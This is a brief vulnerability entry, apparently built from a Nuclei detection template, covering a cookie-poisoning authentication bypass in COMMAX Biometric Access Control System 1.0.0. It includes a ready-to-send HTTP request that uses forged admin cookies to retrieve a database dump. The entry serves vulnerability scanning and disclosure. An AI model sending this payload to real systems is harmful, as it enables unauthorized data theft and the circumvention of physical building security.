# Vulnerability: COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass
**Classification:** COMMAX
**Source:** Nuclei Template (`commax-biometric-auth-bypass.yaml`)

## Description
COMMAX Biometric Access Control System 1.0.0 suffers from an authentication bypass vulnerability. An unauthenticated attacker through cookie poisoning can bypass authentication and disclose sensitive information and circumvent physical controls in smart homes and buildings.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /db_dump.php HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: {{BaseURL}}/user_add.php
Cookie: CMX_SAVED_ID=zero; CMX_ADMIN_ID=science; CMX_ADMIN_NM=liquidworm; CMX_ADMIN_LV=9; CMX_COMPLEX_NM=ZSL; CMX_COMPLEX_IP=2.5.1.0
```

